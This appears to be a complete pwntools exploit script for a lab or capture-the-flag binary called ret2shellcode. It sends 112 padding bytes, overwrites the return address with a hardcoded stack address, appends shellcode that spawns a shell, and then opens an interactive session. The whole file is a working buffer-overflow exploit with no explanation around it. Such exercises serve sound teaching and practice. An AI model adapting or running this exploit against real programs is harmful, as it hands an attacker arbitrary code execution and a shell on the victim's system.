from pwn import *


context.arch = "i386"
pwn_obj = process("./ret2shellcode")
target_addr = 0xffffcf00
payload = b"#" * 112 + p32(target_addr) + asm(shellcraft.sh())
pwn_obj.sendline(payload)
pwn_obj.interactive()
